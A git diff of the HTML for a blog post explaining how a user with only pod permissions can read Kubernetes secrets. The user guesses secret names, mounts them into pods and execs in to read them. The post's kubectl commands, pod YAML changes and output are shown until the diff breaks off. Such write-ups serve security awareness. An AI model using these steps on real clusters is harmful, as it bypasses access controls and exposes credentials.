@@ -3,24 +3,27 @@
   <head>
   <meta charset="utf-8">
 <title>Access Any Kubernetes Secret - Suraj Deshmukh</title>
-<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="A little trickery and access any Kubernetes Secret!">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta name="twitter:card" content="summary_large_image">
+
+<meta property="og:site_name" content="Suraj Deshmukh">
+<meta property="og:title" content="Access Any Kubernetes Secret">
+<meta property="og:description" content="A little trickery and access any Kubernetes Secret!">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://suraj.io/post/2021/05/access-k8s-secrets/">
+    <meta property="og:image" content="https://suraj.io/post/2021/05/access-k8s-secrets/forbidden.jpg">
+    <meta property="og:image:alt" content="Forbidden">
 
 
-<meta name="generator" content="Hugo 0.92.0" /><meta property="og:site_name" content="Suraj Deshmukh">
-  <meta property="og:title" content="Access Any Kubernetes Secret">
-  <meta property="og:description" content="A little trickery and access any Kubernetes Secret!">
-  <meta property="description" content="A little trickery and access any Kubernetes Secret!">
-  <meta property="og:url" content="https://suraj.io/post/2021/05/access-k8s-secrets/">
-  <meta property="og:type" content="article">
-  
-    
-      <meta property="og:image" content="https://suraj.io/post/2021/05/access-k8s-secrets/forbidden.jpg">
-      <meta property="og:image:alt" content="Forbidden">
-    
-  
+  <link rel="shortcut icon" href="/favicon.ico?v=1">
+
+
+  <meta name="generator" content="Hugo 0.110.0">
   
             <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.6.0/styles/github.min.css">
-          <link rel="stylesheet" href="/css/bundle.min.2b4e36cd6a81be0237f8d8f3ce0d239eb39d356f5e3b6c33140b8108476a2beb.css" integrity="sha256-K042zWqBvgI3&#43;Njzzg0jnrOdNW9eO2wzFAuBCEdqK&#43;s="><link rel="stylesheet" href="/css/add-on.css">
+          <link rel="stylesheet" href="/css/bundle.min.3b1b5f2e683d24b1ea3b5a08c8254622e40aa935e0ead75ba6d45c0f14c2f965.css" integrity="sha256-OxtfLmg9JLHqO1oIyCVGIuQKqTXg6tdbptRcDxTC&#43;WU="><link rel="stylesheet" href="/css/add-on.css">
 </head>
 
   <body>
@@ -194,7 +197,7 @@
     
   </div>
   <div class="meta">
-    <time datetime="2021-05-08 12:17:07 &#43;0530 IST">May 8, 2021</time>
+    <time datetime="2021-05-08 12:17:07 &#43;0530 &#43;0530">May 8, 2021</time>
     <p>Suraj Deshmukh</p>
     <p>5-Minute Read</p>
   </div>
@@ -240,46 +243,47 @@
 
       </div>
       <div class="content">
-        <a href="/post/2021/05/access-k8s-secrets/" class="image" style="--bg-image: url('https://suraj.io/post/2021/05/access-k8s-secrets/forbidden.jpg');">
-    <img src="https://suraj.io/post/2021/05/access-k8s-secrets/forbidden.jpg" alt="Forbidden">
+        <a href="/post/2021/05/access-k8s-secrets/" class="image" style="--bg-image: url('/post/2021/05/access-k8s-secrets/forbidden.jpg');">
+    <img src="/post/2021/05/access-k8s-secrets/forbidden.jpg" alt="Forbidden">
   </a>
+        
         <p>Photo by <a href="%22https://unsplash.com/@kylejglenn%22">Kyle Glenn</a> on <a href="%22https://unsplash.com%22">Unsplash</a>.</p>
 <p>You can gain access to any secret that you want in Kubernetes even if you don&rsquo;t have RBAC permissions to get, list or view that secret. All you need is permission that allows you to do anything on pods and an ability to guess the names of secrets. With these two ingredients, here is how you can access any secret out there.</p>
 <h2 id="nasty-user">Nasty User</h2>
 <p>Here is a user called <code>nastyuser</code> who can only do stuff on pod objects. Everything else is forbidden.
 The user cannot list secrets, namespaces or deployments:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl get ns
-Error from server <span style="color:#f92672">(</span>Forbidden<span style="color:#f92672">)</span>: namespaces is forbidden: User <span style="color:#e6db74">&#34;nastyuser&#34;</span> cannot list resource <span style="color:#e6db74">&#34;namespaces&#34;</span> in API group <span style="color:#e6db74">&#34;&#34;</span> at the cluster scope
-
-$ kubectl get secrets
-Error from server <span style="color:#f92672">(</span>Forbidden<span style="color:#f92672">)</span>: secrets is forbidden: User <span style="color:#e6db74">&#34;nastyuser&#34;</span> cannot list resource <span style="color:#e6db74">&#34;secrets&#34;</span> in API group <span style="color:#e6db74">&#34;&#34;</span> in the namespace <span style="color:#e6db74">&#34;default&#34;</span>
-
-$ kubectl get deploy
-Error from server <span style="color:#f92672">(</span>Forbidden<span style="color:#f92672">)</span>: deployments.apps is forbidden: User <span style="color:#e6db74">&#34;nastyuser&#34;</span> cannot list resource <span style="color:#e6db74">&#34;deployments&#34;</span> in API group <span style="color:#e6db74">&#34;apps&#34;</span> in the namespace <span style="color:#e6db74">&#34;default&#34;</span>
-</code></pre></div><p>The user has access to <code>pods</code> and <code>pods/exec</code> and a bunch of other things that are required for a user to have functional access to the Kubernetes:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl auth can-i --list
-Resources                                       Non-Resource URLs   Resource Names   Verbs
-pods/exec                                       <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>
-pods                                            <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>
-selfsubjectaccessreviews.authorization.k8s.io   <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>create<span style="color:#f92672">]</span>
-selfsubjectrulesreviews.authorization.k8s.io    <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>create<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/api/*<span style="color:#f92672">]</span>            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/api<span style="color:#f92672">]</span>              <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/apis/*<span style="color:#f92672">]</span>           <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/apis<span style="color:#f92672">]</span>             <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/healthz<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/healthz<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/livez<span style="color:#f92672">]</span>            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/livez<span style="color:#f92672">]</span>            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/openapi/*<span style="color:#f92672">]</span>        <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/openapi<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/readyz<span style="color:#f92672">]</span>           <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/readyz<span style="color:#f92672">]</span>           <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/version/<span style="color:#f92672">]</span>         <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/version/<span style="color:#f92672">]</span>         <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/version<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-                                                <span style="color:#f92672">[</span>/version<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
-</code></pre></div><p><strong>NOTE:</strong> You will need at least <code>pods/exec</code> or <code>pods/logs</code> to see the content of the secret using the generic bash tools. If you don&rsquo;t have this extra permission, you can create a script that reads contents and uploads the contents somewhere, which you can access from over the web. For the sake of simplicity, I chose <code>pods/exec</code> as extra permission.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ kubectl get ns
+</span></span><span style="display:flex;"><span>Error from server <span style="color:#f92672">(</span>Forbidden<span style="color:#f92672">)</span>: namespaces is forbidden: User <span style="color:#e6db74">&#34;nastyuser&#34;</span> cannot list resource <span style="color:#e6db74">&#34;namespaces&#34;</span> in API group <span style="color:#e6db74">&#34;&#34;</span> at the cluster scope
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ kubectl get secrets
+</span></span><span style="display:flex;"><span>Error from server <span style="color:#f92672">(</span>Forbidden<span style="color:#f92672">)</span>: secrets is forbidden: User <span style="color:#e6db74">&#34;nastyuser&#34;</span> cannot list resource <span style="color:#e6db74">&#34;secrets&#34;</span> in API group <span style="color:#e6db74">&#34;&#34;</span> in the namespace <span style="color:#e6db74">&#34;default&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ kubectl get deploy
+</span></span><span style="display:flex;"><span>Error from server <span style="color:#f92672">(</span>Forbidden<span style="color:#f92672">)</span>: deployments.apps is forbidden: User <span style="color:#e6db74">&#34;nastyuser&#34;</span> cannot list resource <span style="color:#e6db74">&#34;deployments&#34;</span> in API group <span style="color:#e6db74">&#34;apps&#34;</span> in the namespace <span style="color:#e6db74">&#34;default&#34;</span>
+</span></span></code></pre></div><p>The user has access to <code>pods</code> and <code>pods/exec</code> and a bunch of other things that are required for a user to have functional access to the Kubernetes:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ kubectl auth can-i --list
+</span></span><span style="display:flex;"><span>Resources                                       Non-Resource URLs   Resource Names   Verbs
+</span></span><span style="display:flex;"><span>pods/exec                                       <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>pods                                            <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>selfsubjectaccessreviews.authorization.k8s.io   <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>create<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>selfsubjectrulesreviews.authorization.k8s.io    <span style="color:#f92672">[]</span>                  <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>create<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/api/*<span style="color:#f92672">]</span>            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/api<span style="color:#f92672">]</span>              <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/apis/*<span style="color:#f92672">]</span>           <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/apis<span style="color:#f92672">]</span>             <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/healthz<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/healthz<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/livez<span style="color:#f92672">]</span>            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/livez<span style="color:#f92672">]</span>            <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/openapi/*<span style="color:#f92672">]</span>        <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/openapi<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/readyz<span style="color:#f92672">]</span>           <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/readyz<span style="color:#f92672">]</span>           <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/version/<span style="color:#f92672">]</span>         <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/version/<span style="color:#f92672">]</span>         <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/version<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>                                                <span style="color:#f92672">[</span>/version<span style="color:#f92672">]</span>          <span style="color:#f92672">[]</span>               <span style="color:#f92672">[</span>get<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p><strong>NOTE:</strong> You will need at least <code>pods/exec</code> or <code>pods/logs</code> to see the content of the secret using the generic bash tools. If you don&rsquo;t have this extra permission, you can create a script that reads contents and uploads the contents somewhere, which you can access from over the web. For the sake of simplicity, I chose <code>pods/exec</code> as extra permission.</p>
 <p><strong>NOTE:</strong> How you gain access to a kubeconfig that has the aforementioned authorisation is out of the scope of this blog. It is possible to gain access somehow to the host and fortuitously gain access to the service account token secret that has previously mentioned permissions.</p>
 <h2 id="do-what-you-can">Do what you can!</h2>
 <p>Now how do you gain access to secrets with RBAC permissions only for pods? Your social skills and guesswork is going to help you find the name of the secrets. But even if you guess the name of the secret, you cannot access the secret the kubectl way since RBAC won&rsquo;t let you do that. So you will use the only permission you have on the Kubernetes cluster, which is creating pods.</p>
@@ -292,87 +296,87 @@ selfsubjectrulesreviews.authorization.k8s.io    <span style="color:#f92672">[]</
 </ol>
 </blockquote>
 <p>Let&rsquo;s see that in action. Start by creating a dummy pod config:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yaml" data-lang="yaml"><span style="color:#ae81ff">$ kubectl run sleep --image=fedora --dry-run=client -o yaml -- sleep infinity &gt; pod.yaml</span>
-<span style="color:#ae81ff">$ cat pod.yaml</span>
-<span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
-<span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
-<span style="color:#f92672">metadata</span>:
-  <span style="color:#f92672">creationTimestamp</span>: <span style="color:#66d9ef">null</span>
-  <span style="color:#f92672">labels</span>:
-    <span style="color:#f92672">run</span>: <span style="color:#ae81ff">sleep</span>
-  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">sleep</span>
-<span style="color:#f92672">spec</span>:
-  <span style="color:#f92672">containers</span>:
-  - <span style="color:#f92672">args</span>:
-    - <span style="color:#ae81ff">sleep</span>
-    - <span style="color:#ae81ff">infinity</span>
-    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">fedora</span>
-    <span style="color:#f92672">name</span>: <span style="color:#ae81ff">sleep</span>
-    <span style="color:#f92672">resources</span>: {}
-  <span style="color:#f92672">dnsPolicy</span>: <span style="color:#ae81ff">ClusterFirst</span>
-  <span style="color:#f92672">restartPolicy</span>: <span style="color:#ae81ff">Always</span>
-<span style="color:#f92672">status</span>: {}
-</code></pre></div><p>Now add the following changes to the config. Here we are mounting a secret inside the pod at path <code>/access-secret</code>. Once the pod is up and running, we will find the mounted secret in this directory. We will replace the <code>secretName</code> field value from <code>GUESSED_SECRET</code> with something else as we keep on guessing.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">diff --git pod.yaml pod.yaml
-index 479a53d..2376fe3 100644
-<span style="color:#f92672">--- pod.yaml
-</span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ pod.yaml
-</span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -13,6 +13,13 @@ spec:
-</span><span style="color:#75715e"></span>     image: fedora
-     name: sleep
-     resources: {}
-<span style="color:#a6e22e">+    volumeMounts:
-</span><span style="color:#a6e22e">+    - name: hackedsecret
-</span><span style="color:#a6e22e">+      mountPath: /access-secret/
-</span><span style="color:#a6e22e"></span>   dnsPolicy: ClusterFirst
-   restartPolicy: Always
-<span style="color:#a6e22e">+  volumes:
-</span><span style="color:#a6e22e">+  - name: hackedsecret
-</span><span style="color:#a6e22e">+    secret:
-</span><span style="color:#a6e22e">+      secretName: GUESSED_SECRET
-</span><span style="color:#a6e22e"></span> status: {}
-</code></pre></div><h2 id="attempt-1st">Attempt 1st</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yaml" data-lang="yaml"><span style="display:flex;"><span><span style="color:#ae81ff">$ kubectl run sleep --image=fedora --dry-run=client -o yaml -- sleep infinity &gt; pod.yaml</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">$ cat pod.yaml</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">apiVersion</span>: <span style="color:#ae81ff">v1</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">kind</span>: <span style="color:#ae81ff">Pod</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">metadata</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">creationTimestamp</span>: <span style="color:#66d9ef">null</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">labels</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">run</span>: <span style="color:#ae81ff">sleep</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">name</span>: <span style="color:#ae81ff">sleep</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">spec</span>:
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">containers</span>:
+</span></span><span style="display:flex;"><span>  - <span style="color:#f92672">args</span>:
+</span></span><span style="display:flex;"><span>    - <span style="color:#ae81ff">sleep</span>
+</span></span><span style="display:flex;"><span>    - <span style="color:#ae81ff">infinity</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">fedora</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">name</span>: <span style="color:#ae81ff">sleep</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">resources</span>: {}
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">dnsPolicy</span>: <span style="color:#ae81ff">ClusterFirst</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">restartPolicy</span>: <span style="color:#ae81ff">Always</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">status</span>: {}
+</span></span></code></pre></div><p>Now add the following changes to the config. Here we are mounting a secret inside the pod at path <code>/access-secret</code>. Once the pod is up and running, we will find the mounted secret in this directory. We will replace the <code>secretName</code> field value from <code>GUESSED_SECRET</code> with something else as we keep on guessing.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>diff --git pod.yaml pod.yaml
+</span></span><span style="display:flex;"><span>index 479a53d..2376fe3 100644
+</span></span><span style="display:flex;"><span><span style="color:#f92672">--- pod.yaml
+</span></span></span><span style="display:flex;"><span><span style="color:#f92672"></span><span style="color:#a6e22e">+++ pod.yaml
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span><span style="color:#75715e">@@ -13,6 +13,13 @@ spec:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>     image: fedora
+</span></span><span style="display:flex;"><span>     name: sleep
+</span></span><span style="display:flex;"><span>     resources: {}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    volumeMounts:
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    - name: hackedsecret
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+      mountPath: /access-secret/
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span>   dnsPolicy: ClusterFirst
+</span></span><span style="display:flex;"><span>   restartPolicy: Always
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  volumes:
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+  - name: hackedsecret
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+    secret:
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e">+      secretName: GUESSED_SECRET
+</span></span></span><span style="display:flex;"><span><span style="color:#a6e22e"></span> status: {}
+</span></span></code></pre></div><h2 id="attempt-1st">Attempt 1st</h2>
 <p>Use <code>sed</code> to replace the string <code>GUESSED_SECRET</code> and create the pod out of it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sed <span style="color:#e6db74">&#39;s|GUESSED_SECRET|admin|g&#39;</span> pod.yaml | kubectl create -f -
-pod/sleep created
-</code></pre></div><p>Now check the pod:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl get pods
-NAME    READY   STATUS              RESTARTS   AGE
-sleep   0/1     ContainerCreating   <span style="color:#ae81ff">0</span>          96s
-</code></pre></div><p>The pod is in <code>ContainerCreating</code> state for more than a minute that means the secret does not exist, and Kubelet is failing to mount it in the pod. Describing the pod won&rsquo;t tell us anything because we don&rsquo;t have access to the events.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl describe pod sleep | tail -3
-Tolerations:     node.kubernetes.io/not-ready:NoExecute op<span style="color:#f92672">=</span>Exists <span style="color:#66d9ef">for</span> 300s
-                 node.kubernetes.io/unreachable:NoExecute op<span style="color:#f92672">=</span>Exists <span style="color:#66d9ef">for</span> 300s
-Events:          &lt;none&gt;
-</code></pre></div><p>Cleanup by running the following command:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl delete pod sleep
-pod <span style="color:#e6db74">&#34;sleep&#34;</span> deleted
-</code></pre></div><h2 id="attempt-nth">Attempt nth</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sed <span style="color:#e6db74">&#39;s|GUESSED_SECRET|admin|g&#39;</span> pod.yaml | kubectl create -f -
+</span></span><span style="display:flex;"><span>pod/sleep created
+</span></span></code></pre></div><p>Now check the pod:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ kubectl get pods
+</span></span><span style="display:flex;"><span>NAME    READY   STATUS              RESTARTS   AGE
+</span></span><span style="display:flex;"><span>sleep   0/1     ContainerCreating   <span style="color:#ae81ff">0</span>          96s
+</span></span></code></pre></div><p>The pod is in <code>ContainerCreating</code> state for more than a minute that means the secret does not exist, and Kubelet is failing to mount it in the pod. Describing the pod won&rsquo;t tell us anything because we don&rsquo;t have access to the events.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ kubectl describe pod sleep | tail -3
+</span></span><span style="display:flex;"><span>Tolerations:     node.kubernetes.io/not-ready:NoExecute op<span style="color:#f92672">=</span>Exists <span style="color:#66d9ef">for</span> 300s
+</span></span><span style="display:flex;"><span>                 node.kubernetes.io/unreachable:NoExecute op<span style="color:#f92672">=</span>Exists <span style="color:#66d9ef">for</span> 300s
+</span></span><span style="display:flex;"><span>Events:          &lt;none&gt;
+</span></span></code></pre></div><p>Cleanup by running the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ kubectl delete pod sleep
+</span></span><span style="display:flex;"><span>pod <span style="color:#e6db74">&#34;sleep&#34;</span> deleted
+</span></span></code></pre></div><h2 id="attempt-nth">Attempt nth</h2>
 <p>Let&rsquo;s try a different secret name:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sed <span style="color:#e6db74">&#39;s|GUESSED_SECRET|supersecret|g&#39;</span> pod.yaml | kubectl create -f -
-pod/sleep created
-</code></pre></div><p>Let&rsquo;s check the pod status:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl get pods
-NAME    READY   STATUS    RESTARTS   AGE
-sleep   1/1     Running   <span style="color:#ae81ff">0</span>          32s
-</code></pre></div><p>Yay, that means we guessed the secret name correctly. Let&rsquo;s gain access to the pod&rsquo;s terminal to find out the contents of the secrets:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ kubectl exec -it sleep bash
-kubectl exec <span style="color:#f92672">[</span>POD<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>COMMAND<span style="color:#f92672">]</span> is DEPRECATED and will be removed in a future version. Use kubectl exec <span style="color:#f92672">[</span>POD<span style="color:#f92672">]</span> -- <span style="color:#f92672">[</span>COMMAND<span style="color:#f92672">]</span> instead.
-<span style="color:#f92672">[</span>root@sleep /<span style="color:#f92672">]</span><span style="color:#75715e">#</span>
-</code></pre></div><p>Now go to the place where the secret is mounted and discover what is in secret.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>root@sleep ~<span style="color:#f92672">]</span><span style="color:#75715e"># cd /access-secret/</span>
-<span style="color:#f92672">[</span>root@sleep access-secret<span style="color:#f92672">]</span><span style="color:#75715e"># cat data</span>
-supersecretvaluesinhere
-</code></pre></div><h2 id="conclusion">Conclusion</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sed <span style="color:#e6db74">&#39;s|GUESSED_SECRET|supersecret|g&#39;</span> pod.yaml | kubectl create -f -
+</span></span><span style="display:flex;"><span>pod/sleep created
+</span></span></code></pre></div><p>Let&rsquo;s check the pod status:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ kubectl get pods
+</span></span><span style="display:flex;"><span>NAME    READY   STATUS    RESTARTS   AGE
+</span></span><span style="display:flex;"><span>sleep   1/1     Running   <span style="color:#ae81ff">0</span>          32s
